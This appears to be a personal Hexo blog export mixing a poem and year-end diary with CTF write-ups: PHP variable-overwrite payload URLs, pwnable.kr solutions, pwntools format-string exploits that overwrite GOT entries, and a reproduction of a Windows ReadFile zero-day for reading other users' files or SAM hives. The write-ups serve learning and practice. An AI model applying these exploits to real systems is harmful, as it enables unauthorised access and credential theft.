{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"threst","url":"https://threst.github.io"},"pages":[{"title":"","date":"2018-05-17T12:42:34.000Z","updated":"2018-05-17T13:03:11.352Z","comments":true,"path":"about/index.html","permalink":"https://threst.github.io/about/index.html","excerpt":"","text":"我是一个悲哀的孩子始终没有长大我从北方的草滩上走出，沿着一条发白的路，走进布满齿轮的城市走进狭小的街巷板棚，每颗低低的心在一片淡漠的烟中继续讲绿色的故事我相信我的听众天空，还有海上迸溅的水滴他们将覆盖我的一切覆盖那无法寻找的坟墓，我知道那时，所有的草和小花都会围拢在灯光暗淡的一瞬轻轻亲吻我的悲哀"}],"posts":[{"title":"2018流水账","slug":"2018流水账","date":"2018-12-31T04:12:12.000Z","updated":"2018-12-31T13:23:21.831Z","comments":true,"path":"2018/12/31/2018流水账/","link":"","permalink":"https://threst.github.io/2018/12/31/2018流水账/","excerpt":"","text":"南方的一场大雪 带给空间，朋友圈欢乐 也悄悄的带走了2018 对138亿年的宇宙来说 它不过是叠加的一层浮光掠影 而对你我而言 它是人生注定去不复返的一年 一年就这么过去了 我想应该写些什么 作为一个人类 是有限的 但也有手段 可以以一种形式较长时间的存在 我留下些东西 或许可以像那些逝者一般 帮助其它能遇上的人 做一个讲述者 尽量地不消失在这个世界 这是此间存在的意义 要过去了时间从不回头 我们也只能硬着头皮往前走 反正除了这一生我们又没有别的时间 反正你我迟早都会失去 人生的记忆是靠瞬间串起的 在有限的时间里在和这世界相处的过程中 愿我们能拥有更多瞬间也都能在此生玩得尽兴？ 404分类 投稿 跟大佬们去南(gong)京(fei)打(lv)比(you)赛 关于搬运 https://www.secpulse.com/archives/author/threst https://www.anquanke.com/member/131567 http://www.freebuf.com/author/%E5%91%A8%E5%A4%A7%E6%B6%9B 关于编程1.xq17带坑的,bugsacn,补天上面的插件 2.学校的各种代码都放在github上面了 关于影视 神盾局特工1-5 钢的琴 @done (18-03-11 19:13) 缝纫机乐队 @done (18-03-30 18:38) 万物理论 @done (18-03-30 18:38) 太空救援 @done (18-04-03 10:53) 听风者 @done (18-04-05 20:59) 我，花样女王 @done (18-04-06 21:32) 驴得水 @done (18-04-13 21:28) 红海行动 @done (18-05-06 17:34) 北京遇上西雅图 @done (18-05-11 21:18) 复仇者联盟3 @done (18-05-13 13:14) 黑豹 @done (18-05-18 22:15) 雷神1 @done (18-05-26 21:47) 无问西东 @done (18-06-23 10:33) 我不是药神 @done (18-07-08 11:44) 破风 @done (18-07-13 11:44) 超时空同居 @done (18-07-26 10:53) 雷神2 @done (18-07-29 11:00) 雷神3 @done (18-07-29 11:00) 西红柿首富 @done (18-08-03 21:37) 心花路放 @done (18-08-11 17:40) 地心引力 @done (18-08-12 20:39) 一出好戏 @done (18-08-17 20:39) 龙虾刑警 @done (18-08-20 22:42) 异星崛起 @done (18-08-21 22:43) 邪不压正 @done (18-08-24 22:04) 寒站2 @done (18-08-25 22:05) 黄飞鸿之英雄有梦 @done (18-08-26 09:33) 剩者为王 @done (18-08-27 19:29) 蚁人 @done (18-08-27 19:30) 蚁人2 @done (18-09-07 19:58) 死侍2 @done (18-09-08 22:03) 追龙 @done (18-10-04 22:10) 超人总动员2 @done (18-10-26 20:21) 人类清除计划4 @done (18-10-27 20:21) 毒液 @done (18-11-20 17:59) 无名之辈 @done (18-12-02 19:21) 蜘蛛侠:平新宇宙 @done (18-12-31 14:40)","categories":[],"tags":[{"name":"瞎记罢写","slug":"瞎记罢写","permalink":"https://threst.github.io/tags/瞎记罢写/"}]},{"title":"readfile-0day复现","slug":"readfile0day","date":"2018-12-23T05:32:13.000Z","updated":"2018-12-31T13:29:38.810Z","comments":true,"path":"2018/12/23/readfile0day/","link":"","permalink":"https://threst.github.io/2018/12/23/readfile0day/","excerpt":"","text":"poc:下载http://sandboxescaper.blogspot.com/2018/12/readfile-0day.htmlhttp://www.filedropper.com/readfileReadFile函数:https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-readfile新闻:https://www.bleepingcomputer.com/news/security/windows-zero-day-poc-lets-you-read-any-file-with-system-level-access/ ## 漏洞描述该错误发生在“MsiAdvertiseProduct”中调用此函数将导致安装程序服务进行文件复制。这会将我们可以用第一个参数控制的任意文件复制到c:\\windows\\installer …模拟时进行检查，但是使用联结仍然有一个TOCTOU …这意味着我们可以将它复制到SYSTEM ，目标文件将始终可读。这导致任意文件读取漏洞。重现：确保同时复制readfile.exe和“file”（位于文件夹PoC-Files下）…并将它们放在同一目录中。用法：readfile.exe targetfile（其中targetfile是要读取的文件，IE：“readfile.exe c:\\users\\test\\desktop\\desktop.ini”)在2核或更多核上运行，这应该在一个核心上进行一些修改…因为你应该能够用oplocks来达到计时（但我很懒）..你应该能够看到这样的东西，如果它有效：https://www.youtube.com/watch?v=x4P2H64GI1o确认错误的最简单方法是创建两个本地帐户并读取另一个帐户的desktop.ini。即使没有枚举向量，这仍然是坏消息，因为许多文档软件，如office，实际上会将文件保存在静态位置，其中包含最近打开的文档的完整路径和文件名。因此，通过读取这样的文件，你可以获取由其他用户创建的文档的文件名..文件系统是一个spiderweb，并且可以在任何地方找到对用户创建的文件的引用..所以没有枚举错误并不是那么大的交易。如果启用了卷影副本，你可以明显地窃取SAM和SYSTEM hive我认为……也许还有一些其他的用例..但我不是很聪明，所以我不知道。 本地复现1.新建一个test普通用户2.将poc解压3.C:\\Users\\test\\Desktop\\PoC-Files&gt;Readfile.exe C:\\Users\\threst\\Desktop\\key.ps1","categories":[],"tags":[{"name":"0day","slug":"0day","permalink":"https://threst.github.io/tags/0day/"}]},{"title":"2018鹏城杯Myblog思考","slug":"2018鹏城杯Myblog思考","date":"2018-12-20T05:32:13.000Z","updated":"2018-12-31T13:29:28.708Z","comments":true,"path":"2018/12/20/2018鹏城杯Myblog思考/","link":"","permalink":"https://threst.github.io/2018/12/20/2018鹏城杯Myblog思考/","excerpt":"","text":"直接给出源码123456789101112131415&lt;?php$filename = 'flag.txt';$flag = 'flag.txt';extract($_GET);if(isset($sign))&#123; $file = trim(file_get_contents($filename)); if($sign === $file)&#123; echo 'Congratulation!&lt;br&gt;'; echo file_get_contents($$falg); &#125; else&#123; echo 'don`t give up'; &#125;&#125; 首先这个考了两个点，第一个是变量覆盖，第二个是php的可变变量,第一个好绕过直接传参的时候赋值就行 http://127.0.0.1/pc.php?sign=&amp;filename==1可以绕过，但是没有flag,只有Congratulation 接下来就是绕过第二个可变变量。 举个例子12345&lt;?php$a = 'hello';$$a = 'world';?&gt; 那么$a–&gt;hello,$hello–&gt;world 那么我们这么想，我们要把flag.txt的值给$falg,但是不能直接给，但是直接给不了!我们尝试使用第三方，随便弄个f变量来承担这一艰巨的任务 大致流程:12$falg--&gt;$f //把值给f$f--&gt;flag.txt //flag.txt的值给f 尝试以下的paylaod都可以paylaod:http://127.0.0.1/pc.php?sign=&amp;filename=expect://&amp;falg=f&amp;f=flag.txthttp://127.0.0.1/pc.php?sign=&amp;filename=php://filter&amp;falg=f&amp;f=flag.txthttp://127.0.0.1/pc.php?sign=&amp;filename=php://input&amp;falg=f&amp;f=flag.txt 瞎编改题将代码改成这要,去掉一个$123456789101112131415&lt;?php$filename = 'flag.txt';$flag = 'flag.txt';extract($_GET);if(isset($sign))&#123; $file = trim(file_get_contents($filename)); if($sign === $file)&#123; echo 'Congratulation!&lt;br&gt;'; echo file_get_contents($falg); &#125; else&#123; echo 'don`t give up'; &#125;&#125; 这样就不需要第三方的的f来做红娘了,直接把flag.txt的数据给falg,再使用php://input来读取就ok payload:http://127.0.0.1/pc.php?sign=&amp;filename=php://input=falg&amp;falg=flag.txt","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://threst.github.io/tags/ctf/"}]},{"title":"pwnable_fd","slug":"pwnable_fd","date":"2018-12-18T05:32:13.000Z","updated":"2018-12-31T13:29:09.955Z","comments":true,"path":"2018/12/18/pwnable_fd/","link":"","permalink":"https://threst.github.io/2018/12/18/pwnable_fd/","excerpt":"","text":"题目:ssh fd@pwnable.kr -p2222 (pw:guest) 源码123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf(\"pass argv[1] a number\\n\"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf))&#123; printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); &#125; printf(\"learn about Linux file IO\\n\"); return 0;&#125; 几个函数的说明:1.atoi()函数用来将字符串转换成整数(int)，其原型为：int atoi (const char * str);2.定义函数：ssize_t read(int fd, void * buf, size_t count);,read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中。若参数count为0，则read()不会有作用并返回0。返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动。3.strcmp()如果返回值 = 0，则表示 str1 等于 str2。4.局部变量fd表示文件描述符，为read所使用。5.fd是由atoi(argv[1])-0x1234计算出来的，其中argv[1]可控，且程序没有做任何check。6.read的dst buffer是一个全局的数组buf，大小定义为32，且read的第三个参数限定了32，不存在溢出。7.Linux下stdin的定义在/usr/include/unistd.h中 参考大佬的博客,得知fd为文件描述符,关于文件描述符可以参考这篇文章,liunx中一切都可以看做文件，这个题目要求buf为LETMEWIN才可以输出flag,所以我们要把fd的文件描述符修改为0，那么我们就可以标准输入LETMEWIN,在看int fd = atoi( argv[1] ) - 0x1234;这行，他将我们的输入减了0x1234,既然我们要他等于０，那么我们直接输入4660(0x1234)就可以了。 https://api.superbed.cn/pic/5c18874fc4ff9e2b4e045009 flag:mommy! I think I know what a file descriptor is!!","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://threst.github.io/tags/pwn/"}]},{"title":"pwnable_collision","slug":"pwnable_collision","date":"2018-12-18T05:32:13.000Z","updated":"2018-12-31T13:29:02.113Z","comments":true,"path":"2018/12/18/pwnable_collision/","link":"","permalink":"https://threst.github.io/2018/12/18/pwnable_collision/","excerpt":"","text":"12.18Daddy told me about cool MD5 hash collision today.I wanna do something like that too!地址:ssh col@pwnable.kr -p2222 (pw:guest) 题目源码12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf(\"passcode length should be 20 bytes\\n\"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system(\"/bin/cat flag\"); return 0; &#125; else printf(\"wrong passcode.\\n\"); return 0;&#125; 这个程序大致的流程就是:1.用户输入20个char字符2.然后经过check_password函数将20个字符转化为５个int型的数字(每个数字占4个字节)3.再将５个数字相加，是否等于hashcode4.hashcode的值为0x21DD09EC,转化为十进制就是568134124 解题思路:1.将２０个字符分为２个部分2.前16个字符全是0x02,那么就是0x0202020243.为了保证５个整数之和为hashcode,后４个字符为`hex(0x21DD09EC-(0x020202024))4.得到后４个字符为0x19d501e4` 那么我们的payload就是python -c &quot;print &#39;\\x02\\x02\\x02\\x02&#39;*4 + &#39;\\x19\\xd5\\x01\\xe4&#39;&quot;但是经过尝试，失败了, 原来是数字在内存中是按照小端序存储，所以将payload修改成这样:python -c &quot;print &#39;\\x02\\x02\\x02\\x02&#39;*4 + &#39;\\xe4\\x01\\xd5\\x19&#39;&quot; https://api.superbed.cn/pic/5c18908ac4ff9e2b4e04502a flag:daddy! I just managed to create a hash collision :)","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://threst.github.io/tags/pwn/"}]},{"title":"hackagame2018","slug":"hackagame2018","date":"2018-11-22T05:32:13.000Z","updated":"2018-12-31T13:18:16.385Z","comments":true,"path":"2018/11/22/hackagame2018/","link":"","permalink":"https://threst.github.io/2018/11/22/hackagame2018/","excerpt":"","text":"文章首发安全脉搏 签到修改js中控制个数的位数， word文档直接打开就有flag.txt 黑曜石浏览器请使用最新版黑曜石浏览器（HEICORE）打开。 搜索到这个浏览器，一看就是假的，无法直接查看源代码，在url前面添加view-source:,注意要看.html的源代码，不是.php的，因为这个是４０４页面 view-source:https://heicore.com/index.html123456&lt;script type=&quot;text/javascript&quot;&gt; function isLatestHEICORE() &#123; var ua = navigator.userAgent; var HEICORE_UA = &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) HEICORE/49.1.2623.213 Safari/537.36&quot;; return ua === HEICORE_UA; &#125; 回到过去源文件如下:12345678910111213141516171819qedaflag&#123;.a44a2b8a3d9b2\u001bcc44039f93345&#125;.2m32m52m12s/4/tqq 开始一直用strings,cat之类的命令来查看，以为可以，尝试各种组合，结果一直答案错误，然后队长说按照他这个提示自己输入就可以了， 保存为新的文件,打开看看123456flag&#123;t4a2b8c44039f93345a3d9b2&#125; 真的和之前的flag不一样了 flag:flag{t4a2b8c44039f93345a3d9b2} 猫咪克星题目就是连接nc,在30秒内算出所有的式子，写个脚本就可以全部解开，可是之后的式子就变了，变成下面的画风了((int(6!=int(__import__(&#39;time&#39;).sleep(100)!=39))+(42*28))^((int(print(&#39;\\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a&#39;)!=13)&amp;2)*(int(print(&#39;\\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a&#39;)!=1)&lt;&lt;120))) ((int(17==55)|int(89!=int(18!=print(&#39;\\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a&#39;))))&amp;((21|59)^(104&amp;1))) int(((16^60)&amp;(3&gt;&gt;1))&gt;=(int(1!=int(9!=__import__(&#39;os&#39;).system(&#39;find ~&#39;)))+(37-9))) (int((138&gt;&gt;int(__import__(&#39;os&#39;).system(&#39;find ~&#39;)==76))&lt;(int(15!=__import__(&#39;time&#39;).sleep(100))*int(12!=__import__(&#39;os&#39;).system(&#39;find ~&#39;))))*((int(1==exit())&lt;&lt;2)+(5&lt;&lt;int(6!=__import__(&#39;os&#39;).system(&#39;find ~&#39;))))) 如果直接eval()的话会报错，直接退出连接了，看起来不能让他执行这些命令，仔细观察这些式子发现都是==，！=来判断，所以把这些提取出来单独运行试试值为多少。再将这些结果替换为算出来的值就可以了,另外注意sleep(100)要改成sleep(0),因为题目只限30s. 1234567891011121314151617181920212223242526272829#coding:utf-8from pwn import *import rer = remote(\"202.38.95.46\",12009)r.recvline()while True: task = r.recvline() print(task) if 'sleep' in str(task): task = str(task) task = task.replace('sleep(100)','sleep(0)')# print \"转换后:\"+task if 'exit' in str(task): task = str(task) task = task.replace('exit()','0') print \"转换后:\"+task if 'print' in str(task): task = str(task) task = task.replace(\"print('\\\\x1b\\\\x5b\\\\x33\\\\x3b\\\\x4a\\\\x1b\\\\x5b\\\\x48\\\\x1b\\\\x5b\\\\x32\\\\x4a')\",'0')#困扰很久，\\x要转义\\\\x才可以替换 print \"转换后\"+task if 'system' in str(task): task = str(task) task = task.replace(\"__import__('os').system('find ~')\",'0') print \"转换后\"+task else: print '' c = eval(task) print str(c) r.sendline(str(c)) flag:flag{&#39;Life_1s_sh0rt_use_PYTH0N&#39;*1000} 游园会的集章卡片拼图flag{H4PPY_1M4GE_PR0CE551NG} 我是谁哲学思考一开始无论提交什么都是 I am not really sure whether your answer is right.You should probably try again. 直到仔细看到发送的数据包 他问我是谁，我是TEAPOT,喜提一枚flagflag{i_canN0t_BReW_c0ffEE!} Can I help me点开刚才给的url Brewing tea is not so easy.Try using other methods to request this page. 翻译过来就是 泡茶不是那么容易。尝试使用其他方法来请求此页面。 果断改成POST,结果提示 The method “POST” is deprecated.See RFC-7168 for more information. 谷歌到rfc-7168,http://www.ietf.org/rfc/rfc2324.txt,http://hczhcz.github.io/2014/04/02/htcpcp-for-tea.html 修改成BREW,再添加Content-Type 请求:123456789101112BREW /the_super_great_hidden_url_for_brewing_tea/ HTTP/1.1Host: 202.38.95.46:12005User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://202.38.95.46:12005/identityConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: message/teapotContent-Length: 0 响应:12345678HTTP/1.0 300 MULTIPLE CHOICESContent-Type: text/html; charset=utf-8Content-Length: 19Alternates: &#123;&quot;/the_super_great_hidden_url_for_brewing_tea/black_tea&quot; &#123;type message/teapot&#125;&#125;Server: Werkzeug/0.14.1 Python/3.6.6Date: Thu, 11 Oct 2018 14:18:20 GMTSupported tea type: 把响应的url替换成brew的url,再发送 flag:flag{delivering_tea_to_DaLa0}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://threst.github.io/tags/ctf/"}]},{"title":"pwn之路_repeater(山东省赛)","slug":"pwn_repeater","date":"2018-11-14T01:50:13.000Z","updated":"2018-11-14T15:05:18.649Z","comments":true,"path":"2018/11/14/pwn_repeater/","link":"","permalink":"https://threst.github.io/2018/11/14/pwn_repeater/","excerpt":"","text":"repeater考点:格式化字符串漏洞 pwntools知识点fmtstr_payload是pwntools提供的函数，用于自动生成格式化字符串。 fmtstr_payload有两个参数,第一个参数是int，用于表示取参数的偏移个数,第二个参数是字典，字典的意义是往key的地址，写入value的值 fmtstr_payload(7, {printf_got: system_add}) 这个函数调用会往printf_got中写入system_add 分析代码此题为简单的格式化字符串漏洞，首先总览分析一下程序，循环受totalcount次数限制，初始值为1。 程序提供了 getFlag 方法，但是需要变量 number为 0x2018 才会执行命令。 一个一个killtotalcount接下来思路就很清晰了，首先改写totalcount变量，使得循环执行更多次。 totalcount的地址为0x0804A064,所以要将其修改为3 12payload = fmtstr_payload(4,&#123;0x0804A064:0x3&#125;)p.sendline(payload) number然后改写 number 为 0x2018。同样我们要在.data中寻找number的值 12payload = fmtstr_payload(4,&#123;0x0804A060:0x2018&#125;)p.sendline(payload) getflag在最开始的图中我们可以知道，格式化字符串输出后就调用了puts函数，我们要做的就是将puts其地址修改为getflag函数的地址,最后调用 getFlag方法获取 Flag。 那么我们现在有了新问题，怎么找到puts的地址和getflag的地址？介绍两种方法 方法1(puts)使用objdump -R repeater命令 地址为0x0804a014 方法2(puts)ida找got表 getflag地址直接ida打开就行 框框中的地址好像都可以用 payload好了现在我们有了puts的地址0x0804a014,getflag的地址0x080485B6 脚本如下 12payload = fmtstr_payload(4,&#123;0x804a014:0x080485B6&#125;)p.sendline(payload) exp最后代码 12345678910from pwn import *p = process('./repeater')payload = fmtstr_payload(4,&#123;0x0804A064:0x3&#125;)p.sendline(payload)payload = fmtstr_payload(4,&#123;0x0804A060:0x2018&#125;)p.sendline(payload)payload = fmtstr_payload(4,&#123;0x804a014:0x080485B6&#125;)p.sendline(payload)p.interactive() 小知识点1.寻找偏移量看输出判断,比如这个题的偏移量为４，我们这样来确定 输入AAAA.%x.%x.%x.%x.%x.%x.%x,查看打印的字符41414141在AAAA后面第几个偏移量就为多少,这个是第４个，所以偏移量为4. 我们再来一个,源码来自ctf-wiki中格式化字符串 123456789101112131415161718/* example/overflow/overflow.c */#include &lt;stdio.h&gt;int a = 123, b = 456;int main() &#123; int c = 789; char s[100]; printf(\"%p\\n\", &amp;c); scanf(\"%s\", s); printf(s); if (c == 16) &#123; puts(\"modified c.\"); &#125; else if (a == 2) &#123; puts(\"modified a for a small number.\"); &#125; else if (b == 0x12345678) &#123; puts(\"modified b for a big number!\"); &#125; return 0;&#125; 编译下gcc -m32 -fno-stack-protector -no-pie -o overflow overflow.c 根据上面讲的，这个的偏移量就是6,我们尝试下修改a的值 首先找到a地址为0x0804C024 12345from pwn import *sh = process('./overflow')payload = fmtstr_payload(6,&#123;0x0804C024:0x2&#125;)sh.sendline(payload)sh.interactive() 成功修改,同理修改b 12345from pwn import *sh = process('./overflow')payload = fmtstr_payload(6,&#123;0x0804C028:0x12345678&#125;)#b的地址为28sh.sendline(payload)sh.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://threst.github.io/tags/pwn/"}]},{"title":"无处安放的wp(不定期更)","slug":"ctf","date":"2018-11-11T06:32:13.000Z","updated":"2018-11-11T10:16:38.594Z","comments":true,"path":"2018/11/11/ctf/","link":"","permalink":"https://threst.github.io/2018/11/11/ctf/","excerpt":"","text":"tjctfvar md5 = function (string) &#123; function RotateLeft(lValue, iShiftBits) &#123; return (lValue&lt;&lt;iShiftBits) | (lValue&gt;&gt;&gt;(32-iShiftBits)); &#125; function AddUnsigned(lX,lY) &#123; var lX4,lY4,lX8,lY8,lResult; lX8 = (lX &amp; 0x80000000); lY8 = (lY &amp; 0x80000000); lX4 = (lX &amp; 0x40000000); lY4 = (lY &amp; 0x40000000); lResult = (lX &amp; 0x3FFFFFFF)+(lY &amp; 0x3FFFFFFF); if (lX4 &amp; lY4) &#123; return (lResult ^ 0x80000000 ^ lX8 ^ lY8); &#125; if (lX4 | lY4) &#123; if (lResult &amp; 0x40000000) &#123; return (lResult ^ 0xC0000000 ^ lX8 ^ lY8); &#125; else &#123; return (lResult ^ 0x40000000 ^ lX8 ^ lY8); &#125; &#125; else &#123; return (lResult ^ lX8 ^ lY8); &#125; &#125; function F(x,y,z) &#123; return (x &amp; y) | ((~x) &amp; z); &#125; function G(x,y,z) &#123; return (x &amp; z) | (y &amp; (~z)); &#125; function H(x,y,z) &#123; return (x ^ y ^ z); &#125; function I(x,y,z) &#123; return (y ^ (x | (~z))); &#125; function FF(a,b,c,d,x,s,ac) &#123; a = AddUnsigned(a, AddUnsigned(AddUnsigned(F(b, c, d), x), ac)); return AddUnsigned(RotateLeft(a, s), b); &#125;; function GG(a,b,c,d,x,s,ac) &#123; a = AddUnsigned(a, AddUnsigned(AddUnsigned(G(b, c, d), x), ac)); return AddUnsigned(RotateLeft(a, s), b); &#125;; function HH(a,b,c,d,x,s,ac) &#123; a = AddUnsigned(a, AddUnsigned(AddUnsigned(H(b, c, d), x), ac)); return AddUnsigned(RotateLeft(a, s), b); &#125;; function II(a,b,c,d,x,s,ac) &#123; a = AddUnsigned(a, AddUnsigned(AddUnsigned(I(b, c, d), x), ac)); return AddUnsigned(RotateLeft(a, s), b); &#125;; function ConvertToWordArray(string) &#123; var lWordCount; var lMessageLength = string.length; var lNumberOfWords_temp1=lMessageLength + 8; var lNumberOfWords_temp2=(lNumberOfWords_temp1-(lNumberOfWords_temp1 % 64))/64; var lNumberOfWords = (lNumberOfWords_temp2+1)*16; var lWordArray=Array(lNumberOfWords-1); var lBytePosition = 0; var lByteCount = 0; while ( lByteCount &lt; lMessageLength ) &#123; lWordCount = (lByteCount-(lByteCount % 4))/4; lBytePosition = (lByteCount % 4)*8; lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount)&lt;&lt;lBytePosition)); lByteCount++; &#125; lWordCount = (lByteCount-(lByteCount % 4))/4; lBytePosition = (lByteCount % 4)*8; lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80&lt;&lt;lBytePosition); lWordArray[lNumberOfWords-2] = lMessageLength&lt;&lt;3; lWordArray[lNumberOfWords-1] = lMessageLength&gt;&gt;&gt;29; return lWordArray; &#125;; function WordToHex(lValue) &#123; var WordToHexValue=\"\",WordToHexValue_temp=\"\",lByte,lCount; for (lCount = 0;lCount&lt;=3;lCount++) &#123; lByte = (lValue&gt;&gt;&gt;(lCount*8)) &amp; 255; WordToHexValue_temp = \"0\" + lByte.toString(16); WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length-2,2); &#125; return WordToHexValue; &#125;; function Utf8Encode(string) &#123; string = string.replace(/\\r\\n/g,\"\\n\"); var utftext = \"\"; for (var n = 0; n &lt; string.length; n++) &#123; var c = string.charCodeAt(n); if (c &lt; 128) &#123; utftext += String.fromCharCode(c); &#125; else if((c &gt; 127) &amp;&amp; (c &lt; 2048)) &#123; utftext += String.fromCharCode((c &gt;&gt; 6) | 192); utftext += String.fromCharCode((c &amp; 63) | 128); &#125; else &#123; utftext += String.fromCharCode((c &gt;&gt; 12) | 224); utftext += String.fromCharCode(((c &gt;&gt; 6) &amp; 63) | 128); utftext += String.fromCharCode((c &amp; 63) | 128); &#125; &#125; return utftext; &#125;; var x=Array(); var k,AA,BB,CC,DD,a,b,c,d; var S11=7, S12=12, S13=17, S14=22; var S21=5, S22=9 , S23=14, S24=20; var S31=4, S32=11, S33=16, S34=23; var S41=6, S42=10, S43=15, S44=21; string = Utf8Encode(string); x = ConvertToWordArray(string); a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476; for (k=0;k&lt;x.length;k+=16) &#123; AA=a; BB=b; CC=c; DD=d; a=FF(a,b,c,d,x[k+0], S11,0xD76AA478); d=FF(d,a,b,c,x[k+1], S12,0xE8C7B756); c=FF(c,d,a,b,x[k+2], S13,0x242070DB); b=FF(b,c,d,a,x[k+3], S14,0xC1BDCEEE); a=FF(a,b,c,d,x[k+4], S11,0xF57C0FAF); d=FF(d,a,b,c,x[k+5], S12,0x4787C62A); c=FF(c,d,a,b,x[k+6], S13,0xA8304613); b=FF(b,c,d,a,x[k+7], S14,0xFD469501); a=FF(a,b,c,d,x[k+8], S11,0x698098D8); d=FF(d,a,b,c,x[k+9], S12,0x8B44F7AF); c=FF(c,d,a,b,x[k+10],S13,0xFFFF5BB1); b=FF(b,c,d,a,x[k+11],S14,0x895CD7BE); a=FF(a,b,c,d,x[k+12],S11,0x6B901122); d=FF(d,a,b,c,x[k+13],S12,0xFD987193); c=FF(c,d,a,b,x[k+14],S13,0xA679438E); b=FF(b,c,d,a,x[k+15],S14,0x49B40821); a=GG(a,b,c,d,x[k+1], S21,0xF61E2562); d=GG(d,a,b,c,x[k+6], S22,0xC040B340); c=GG(c,d,a,b,x[k+11],S23,0x265E5A51); b=GG(b,c,d,a,x[k+0], S24,0xE9B6C7AA); a=GG(a,b,c,d,x[k+5], S21,0xD62F105D); d=GG(d,a,b,c,x[k+10],S22,0x2441453); c=GG(c,d,a,b,x[k+15],S23,0xD8A1E681); b=GG(b,c,d,a,x[k+4], S24,0xE7D3FBC8); a=GG(a,b,c,d,x[k+9], S21,0x21E1CDE6); d=GG(d,a,b,c,x[k+14],S22,0xC33707D6); c=GG(c,d,a,b,x[k+3], S23,0xF4D50D87); b=GG(b,c,d,a,x[k+8], S24,0x455A14ED); a=GG(a,b,c,d,x[k+13],S21,0xA9E3E905); d=GG(d,a,b,c,x[k+2], S22,0xFCEFA3F8); c=GG(c,d,a,b,x[k+7], S23,0x676F02D9); b=GG(b,c,d,a,x[k+12],S24,0x8D2A4C8A); a=HH(a,b,c,d,x[k+5], S31,0xFFFA3942); d=HH(d,a,b,c,x[k+8], S32,0x8771F681); c=HH(c,d,a,b,x[k+11],S33,0x6D9D6122); b=HH(b,c,d,a,x[k+14],S34,0xFDE5380C); a=HH(a,b,c,d,x[k+1], S31,0xA4BEEA44); d=HH(d,a,b,c,x[k+4], S32,0x4BDECFA9); c=HH(c,d,a,b,x[k+7], S33,0xF6BB4B60); b=HH(b,c,d,a,x[k+10],S34,0xBEBFBC70); a=HH(a,b,c,d,x[k+13],S31,0x289B7EC6); d=HH(d,a,b,c,x[k+0], S32,0xEAA127FA); c=HH(c,d,a,b,x[k+3], S33,0xD4EF3085); b=HH(b,c,d,a,x[k+6], S34,0x4881D05); a=HH(a,b,c,d,x[k+9], S31,0xD9D4D039); d=HH(d,a,b,c,x[k+12],S32,0xE6DB99E5); c=HH(c,d,a,b,x[k+15],S33,0x1FA27CF8); b=HH(b,c,d,a,x[k+2], S34,0xC4AC5665); a=II(a,b,c,d,x[k+0], S41,0xF4292244); d=II(d,a,b,c,x[k+7], S42,0x432AFF97); c=II(c,d,a,b,x[k+14],S43,0xAB9423A7); b=II(b,c,d,a,x[k+5], S44,0xFC93A039); a=II(a,b,c,d,x[k+12],S41,0x655B59C3); d=II(d,a,b,c,x[k+3], S42,0x8F0CCC92); c=II(c,d,a,b,x[k+10],S43,0xFFEFF47D); b=II(b,c,d,a,x[k+1], S44,0x85845DD1); a=II(a,b,c,d,x[k+8], S41,0x6FA87E4F); d=II(d,a,b,c,x[k+15],S42,0xFE2CE6E0); c=II(c,d,a,b,x[k+6], S43,0xA3014314); b=II(b,c,d,a,x[k+13],S44,0x4E0811A1); a=II(a,b,c,d,x[k+4], S41,0xF7537E82); d=II(d,a,b,c,x[k+11],S42,0xBD3AF235); c=II(c,d,a,b,x[k+2], S43,0x2AD7D2BB); b=II(b,c,d,a,x[k+9], S44,0xEB86D391); a=AddUnsigned(a,AA); b=AddUnsigned(b,BB); c=AddUnsigned(c,CC); d=AddUnsigned(d,DD); &#125; var temp = WordToHex(a)+WordToHex(b)+WordToHex(c)+WordToHex(d); return temp.toLowerCase();&#125;$(document).ready(function() &#123; $(\"#login-form\").submit(function() &#123; if (md5($(\"#password\").val()).toLowerCase() === \"698967f805dea9ea073d188d73ab7390\") &#123; $(\"html\").html(\"&lt;h1&gt;Login Succeeded!&lt;/h1&gt;\"); &#125; else &#123; $(\"html\").html(\"&lt;h1&gt;Login Failed!&lt;/h1&gt;\"); &#125; &#125;)&#125;); 